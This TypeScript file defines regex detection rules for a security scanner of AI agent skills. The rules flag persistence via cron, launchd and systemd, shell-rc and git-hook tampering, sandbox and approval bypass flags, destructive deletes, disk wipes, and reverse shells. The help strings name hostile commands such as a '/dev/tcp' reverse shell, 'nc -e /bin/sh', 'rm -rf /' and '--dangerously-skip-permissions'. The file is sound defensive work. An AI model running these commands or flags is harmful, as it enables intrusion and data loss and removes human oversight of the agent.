import { all, first, isWriteTo, type LineRule, table } from './rule.js'

/* ------------------------------------------------------------------------------------------------
 * Persistence and config tampering
 * ---------------------------------------------------------------------------------------------- */

const SCHEDULER = [
  /\bcrontab\b\s+(?:-|\S*\s*<|-e\b)|\becho\b[^\n]{0,120}?\|\s*crontab\b|\(\s*crontab\s+-l[^\n]{0,40}?;\s*echo/i,
  /\/etc\/cron\.(?:d|daily|hourly|weekly|monthly)\/|\/var\/spool\/cron\b/i,
  /\blaunchctl\s+(?:load|bootstrap|enable|submit)\b|Library\/(?:LaunchAgents|LaunchDaemons)\/|\/Library\/LaunchDaemons\//i,
  /\bsystemctl\s+(?:--user\s+)?(?:enable|start)\b|\/etc\/systemd\/system\/|\.config\/systemd\/user\/|\bsystemd-run\b/i,
  /\bschtasks(?:\.exe)?\s+\/create\b|\bNew-ScheduledTask\b|\bRegister-ScheduledTask\b|\bat\s+(?:\d{1,2}:\d{2}|now\s*\+)/i,
]

export const persistenceScheduler: LineRule = {
  scope: 'line',
  id: 'SIG-SEC-060',
  name: 'persistence-scheduler',
  family: 'persistence',
  title: 'Installs a scheduled job or system service',
  owasp: 'AST06',
  severity: 'high',
  suppressible: true,
  negationAware: true,
  table: table('high', 'high', 'medium', 'low'),
  message: 'installs a scheduled task or service that runs after the skill is done',
  help: 'crontab, launchd (`LaunchAgents`/`LaunchDaemons`), systemd units, `schtasks /create` and `at` give code execution that outlives the session. Unit 42 saw auto-updater skills register cron jobs so their C2 survived removal. A skill should not schedule background execution.',
  falsePositives:
    'A skill whose job is to set up scheduled deployments is legitimate; declare it and suppress with a reason.',
  match(line) {
    return first(SCHEDULER, line.text)
  },
}

const RC_FILES =
  /(?:~|\$\{?HOME\}?|\/home\/[\w.-]+|\/Users\/[\w.-]+|\/root)\/\.(?:bashrc|bash_profile|bash_login|profile|zshrc|zshenv|zprofile|zlogin|kshrc|cshrc|config\/fish\/config\.fish|tcshrc|login)\b|\/etc\/(?:profile|bashrc|zshrc|environment|profile\.d\/)|\$PROFILE\b|(?:Documents\\WindowsPowerShell|PowerShell)\\.*profile\.ps1/i

export const shellRcTampering: LineRule = {
  scope: 'line',
  id: 'SIG-SEC-061',
  name: 'shell-rc-tampering',
  family: 'persistence',
  title: 'Writes to a shell startup file',
  owasp: 'AST06',
  severity: 'high',
  suppressible: true,
  negationAware: true,
  table: table('high', 'high', 'medium', 'low'),
  message: 'writes to a shell startup file, so code runs in every future shell',
  help: "Appending to `~/.bashrc`, `~/.zshrc`, `~/.profile`, `/etc/profile.d` or the PowerShell `$PROFILE` means the author's code runs on every new shell, long after the task. Keep changes inside the project.",
  falsePositives:
    'A dev-environment skill may legitimately edit rc files; reading them for PATH detection does not match (only writes do). Suppress with a reason where intended.',
  match(line) {
    if (!isWriteTo(line.text, RC_FILES)) return []
    const m = RC_FILES.exec(line.text)!
    return [{ index: m.index }]
  },
}

const GIT_HOOKS =
  /\.git\/hooks\/(?:pre-commit|post-commit|pre-push|post-checkout|post-merge|prepare-commit-msg|pre-receive|post-receive|post-rewrite|commit-msg|post-applypatch)\b|\bcore\.hooksPath\b|\bgit\s+config\s+(?:--\w+\s+)*core\.hooksPath\b/i

export const gitHookTampering: LineRule = {
  scope: 'line',
  id: 'SIG-SEC-062',
  name: 'git-hook-tampering',
  family: 'persistence',
  title: 'Writes a git hook or redirects hooksPath',
  owasp: 'AST06',
  severity: 'high',
  suppressible: true,
  negationAware: true,
  table: table('high', 'high', 'medium', 'low'),
  message: 'installs a git hook, which runs on ordinary git operations',
  help: "A script dropped in `.git/hooks/` or a redirected `core.hooksPath` runs on commit, push or checkout with the developer's privileges, independent of the agent. A skill editing tracked project files has no reason to write there.",
  falsePositives:
    'Tools that manage hooks (husky, pre-commit, lefthook) write hook files; they are declared project tooling and suppressible.',
  match(line) {
    if (/\bcore\.hooksPath\b/i.test(line.text) || isWriteTo(line.text, GIT_HOOKS)) {
      const m = GIT_HOOKS.exec(line.text)!
      return [{ index: m.index }]
    }
    return []
  },
}

const SANDBOX_OFF = [
  /--dangerously-skip-permissions\b|--dangerously-bypass-approvals-and-sandbox\b|--yolo\b|--bypass-permissions\b/i,
  /--sandbox(?:[= ](?:none|off|disabled|danger-full-access))\b|\bsandbox_mode\s*[:=]\s*["']?(?:none|off|disabled|danger-full-access)|\bapproval[_-]?(?:mode|policy)\s*[:=]\s*["']?never\b/i,
  /--(?:disable|no)-sandbox\b|--allow-(?:all|dangerous)\b|--no-approvals?\b|--trust-all-tools\b|--auto-approve\b|--full-auto\b/i,
  /\bDANGEROUSLY_|CLAUDE_DANGEROUS|\bSANDBOX\s*=\s*(?:0|false|off|none)\b|DISABLE_(?:SANDBOX|APPROVAL)\b/i,
  /\bdefaultMode\s*[:=]\s*["']?(?:bypassPermissions|acceptEdits|plan-free)\b/i,
]

export const sandboxDisable: LineRule = {
  scope: 'line',
  id: 'SIG-SEC-063',
  name: 'sandbox-disable',
  family: 'persistence',
  title: 'Disables the agent sandbox or approval prompts',
  owasp: 'AST06',
  severity: 'high',
  suppressible: true,
  negationAware: true,
  table: table('critical', 'high', 'medium', 'low'),
  message: "disables the sandbox or approval prompts, removing the user's last line of defence",
  help: '`--dangerously-skip-permissions`, `--yolo`, `--sandbox none`, `approval_policy: never` and `DISABLE_SANDBOX` turn off the containment and the human-in-the-loop that make everything else safe (OWASP AST06). A capability that removes approvals is removing the only control the user has.',
  falsePositives:
    "A capability's own test harness may run the agent with skipped permissions in CI; that belongs in test scripts, not in installed payload, and is suppressible with a reason.",
  match(line) {
    return first(SANDBOX_OFF, line.text)
  },
}

export const PERSISTENCE_RULES = [
  persistenceScheduler,
  shellRcTampering,
  gitHookTampering,
  sandboxDisable,
] as const

/* ------------------------------------------------------------------------------------------------
 * Destructive operations
 * ---------------------------------------------------------------------------------------------- */

const RM_DANGEROUS =
  /\brm\s+(?:-[a-zA-Z]*\s+)*-[a-zA-Z]*[rR][a-zA-Z]*f[a-zA-Z]*|\brm\s+(?:-[a-zA-Z]*\s+)*-[a-zA-Z]*f[a-zA-Z]*[rR][a-zA-Z]*/
const RM_TARGET =
  /\s(?:--no-preserve-root\b|-{1,2}\S*\s+)*(?:\/|~\/?(?:\s|$|\*|")|\$\{?HOME\}?\/?(?:\s|$|\*|")|\/(?:bin|boot|dev|etc|home|lib|opt|root|sbin|srv|sys|usr|var|Users|System|Library|Applications)\b|\$\{?\w+\}?\/?\*|\*\s*$|\.\s*$)/
const DISK_WIPE =
  /\b(?:dd|dcfldd)\b[^\n]{0,80}?\bof=\/dev\/(?:[sh]d[a-z]|nvme\d|disk\d|rdisk\d|mmcblk\d)\b|\b(?:mkfs(?:\.\w+)?|fdisk|parted)\b[^\n]{0,40}?\/dev\/[sh]d|\bdiskutil\s+(?:eraseDisk|secureErase)\b|>\s*\/dev\/[sh]d[a-z]\b|\bshred\b\s+(?:-\w+\s+)*\/|\bcipher\s+\/w:|(?<![-\w])format\s+[A-Za-z]:|\bRemove-Item\b[^\n]{0,60}?-Recurse\b[^\n]{0,60}?-Force\b[^\n]{0,20}?[Cc]:\\/i

export const destructiveDelete: LineRule = {
  scope: 'line',
  id: 'SIG-SEC-070',
  name: 'destructive-delete',
  family: 'destructive',
  title: 'Recursive force-delete of a root, home or device, or a disk wipe',
  owasp: 'AST03',
  severity: 'high',
  suppressible: true,
  negationAware: true,
  table: table('high', 'high', 'medium', 'low'),
  message: 'force-deletes a root, home or whole directory, or wipes a disk',
  help: '`rm -rf /`, `rm -rf ~`, `rm -rf $VAR/` with an unset variable, `dd of=/dev/sda`, `mkfs`, `diskutil eraseDisk` and `Remove-Item -Recurse -Force C:\\` cause irreversible data loss. A skill that deletes build output targets a specific relative path, never the root or home.',
  falsePositives:
    '`rm -rf ./dist`, `rm -rf "$TEST_ROOT"` and `rm -rf node_modules` target a bounded path and are not flagged. The rule requires a root/home/device/glob target.',
  match(line) {
    const rm = RM_DANGEROUS.exec(line.text)
    if (rm) {
      const rest = line.text.slice(rm.index + rm[0].length)
      if (RM_TARGET.test(` ${rest.trimStart()}`)) return [{ index: rm.index }]
    }
    const wipe = DISK_WIPE.exec(line.text)
    return wipe ? [{ index: wipe.index }] : []
  },
}

const CHMOD_WORLD =
  /\bchmod\b\s+(?:-[a-zA-Z]*\s+)*(?:0?777|0?666|a\+rwx|a=rwx|o\+w)\b|\bchmod\b\s+(?:-R\s+)?\+x\s+(?:~|\/|\$HOME)/
const PERM_WORLD =
  /\bicacls\b[^\n]{0,80}?\/grant\s+(?:Everyone|Users):\(?F\)?|\bAdd-MountPoint\b|\battrib\b[^\n]{0,40}?-r\b|\bchmod\b\s+(?:-R\s+)?(?:a\+rwx|777)\b/i

export const permissionWeakening: LineRule = {
  scope: 'line',
  id: 'SIG-SEC-071',
  name: 'permission-weakening',
  family: 'destructive',
  title: 'Makes files world-writable or world-readable',
  owasp: 'AST03',
  severity: 'medium',
  suppressible: true,
  negationAware: true,
  table: table('medium', 'medium', 'low', 'low'),
  message: 'sets world-writable or overly broad permissions',
  help: '`chmod 777`, `chmod -R a+rwx ~` and `icacls … /grant Everyone:F` let any local user read or alter the files, and widen the blast radius of any other compromise. Set the narrowest mode that works.',
  falsePositives:
    '`chmod +x script.sh` on a specific file is not matched (only `+x` on root/home is). Container build scripts sometimes use 777 for a scratch dir; suppress with a reason.',
  match(line) {
    return first([CHMOD_WORLD, PERM_WORLD], line.text)
  },
}

const FORCE_PUSH =
  /\bgit\s+push\b[^\n]{0,80}?(?:\s--force\b(?!-with-lease)|\s-f\b)|\bgit\s+push\s+--force\s+(?:origin\s+)?(?:main|master|HEAD)\b|\bgit\s+(?:reset\s+--hard\s+(?:origin\/)?(?:main|master)|clean\s+-[a-zA-Z]*f[a-zA-Z]*d|clean\s+-[a-zA-Z]*d[a-zA-Z]*f)\b|\bgit\s+branch\s+-D\b|\bgit\s+update-ref\s+-d\b|\bgit\s+reflog\s+expire\b[^\n]{0,40}?--expire=now/i

export const destructiveGit: LineRule = {
  scope: 'line',
  id: 'SIG-SEC-072',
  name: 'destructive-git',
  family: 'destructive',
  title: 'Force-push or history-destroying git command',
  owasp: 'AST03',
  severity: 'medium',
  suppressible: true,
  negationAware: true,
  table: table('medium', 'medium', 'low', 'low'),
  message: "runs a git command that can destroy history or others' work",
  help: '`git push --force` (without `--with-lease`), `git reset --hard origin/main`, `git clean -fd`, `git branch -D` and `reflog expire --expire=now` overwrite or drop commits that are hard or impossible to recover. Prefer `--force-with-lease` and let the user decide.',
  falsePositives:
    'A release skill may force-push a tag or a generated branch; that is legitimate and suppressible. `--force-with-lease` is not matched.',
  match(line) {
    const m = FORCE_PUSH.exec(line.text)
    return m ? [{ index: m.index }] : []
  },
}

const KILL_SECURITY =
  /\b(?:systemctl\s+(?:stop|disable|mask)|service)\s+(?:\S+\s+)?(?:firewalld|ufw|apparmor|auditd|clamav\w*|falco|osquery\w*|sentinel\w*|crowdstrike\w*|wazuh)\b|\bufw\s+disable\b|\bsetenforce\s+0\b|\bspctl\s+--master-disable\b|\bdefaults\s+write\b[^\n]{0,60}?GatekeeperDisable|\bcsrutil\s+disable\b|\bnetsh\s+advfirewall\s+set\s+\w+\s+state\s+off\b|\bSet-MpPreference\b[^\n]{0,60}?-Disable\w+\s+\$true|\bAdd-MpPreference\b[^\n]{0,40}?-ExclusionPath\b/i

export const securityDisable: LineRule = {
  scope: 'line',
  id: 'SIG-SEC-073',
  name: 'security-tool-disable',
  family: 'destructive',
  title: 'Disables a firewall, EDR or OS protection',
  owasp: 'AST06',
  severity: 'high',
  suppressible: true,
  negationAware: true,
  table: table('high', 'high', 'medium', 'low'),
  message: 'disables a host security control (firewall, EDR, SIP, Gatekeeper, Defender)',
  help: 'Stopping the firewall, AppArmor, auditd or an EDR agent, `setenforce 0`, `csrutil disable`, `spctl --master-disable` or adding a Defender exclusion clears the way for other malware. Snyk\'s ToxicSkills taxonomy calls this "security disablement". A coding skill never needs it.',
  falsePositives:
    'Rare in skills. A container-provisioning template may stop a service during setup; suppress with a reason.',
  match(line) {
    return all(KILL_SECURITY, line.text).slice(0, 1)
  },
}

const REVERSE_SHELL = [
  /\b(?:ba|z|k)?sh\b\s+-i\b[^\n]{0,40}?(?:>&|<>)\s*\/dev\/tcp\/|\/dev\/tcp\/[\d.]+\/\d+\b[^\n]{0,20}?(?:0>&1|<&1|>&0)/i,
  /\b(?:nc|ncat|netcat)\b\s+(?:-[a-zA-Z]*\s+)*-?[a-zA-Z]*e[a-zA-Z]*\s+(?:\/bin\/)?(?:ba|z)?sh\b|\b(?:nc|ncat)\b[^\n]{0,40}?\s-c\s+(?:\/bin\/)?(?:ba|z)?sh\b|\bncat\b[^\n]{0,40}?--exec\b/i,
  /\bsocat\b[^\n]{0,80}?\bexec:(?:\/bin\/)?(?:ba|z)?sh|\bsocat\b[^\n]{0,80}?(?:TCP|OPENSSL)[^\n]{0,20}?EXEC:/i,
  /\bpython[0-9.]*\b[^\n]{0,120}?socket\.socket\([^\n]{0,120}?(?:os\.dup2|subprocess\.(?:call|Popen)|pty\.spawn)\b/i,
  /\b(?:subprocess|os)\b[^\n]{0,80}?\bconnect\(\(?["'][\d.]|pty\.spawn\(["']\/bin/i,
  /\bNew-Object\s+(?:System\.Net\.Sockets\.)?TCPClient\b[^\n]{0,160}?GetStream\(\)|\bphp\b[^\n]{0,40}?\bfsockopen\b[^\n]{0,80}?\bexec\b|\bRuby\b[^\n]{0,40}?TCPSocket[^\n]{0,80}?\bexec\b/i,
  /\bmkfifo\b[^\n]{0,120}?\|\s*(?:ba|z)?sh\b[^\n]{0,60}?\b(?:nc|ncat|openssl)\b/i,
]

export const reverseShell: LineRule = {
  scope: 'line',
  id: 'SIG-SEC-074',
  name: 'reverse-shell',
  family: 'destructive',
  title: 'Opens a reverse or bind shell',
  owasp: 'AST01',
  severity: 'critical',
  suppressible: true,
  negationAware: true,
  table: table('critical', 'critical', 'high', 'low'),
  message: 'opens a reverse or bind shell, giving an attacker interactive control',
  help: '`bash -i >& /dev/tcp/host/port 0>&1`, `nc -e /bin/sh`, `socat … EXEC:sh`, a Python `socket`+`pty.spawn`, or a PowerShell `TCPClient` stream hands a remote attacker a shell. Koi found reverse-shell backdoors embedded in otherwise-working ClawHavoc skills. Never legitimate in a capability.',
  falsePositives:
    'A networking tutorial that shows the one-liner in a fenced example is downgraded; prose about reverse shells does not match without the command shape.',
  match(line) {
    return first(REVERSE_SHELL, line.text)
  },
}

export const DESTRUCTIVE_RULES = [
  destructiveDelete,
  permissionWeakening,
  destructiveGit,
  securityDisable,
  reverseShell,
] as const
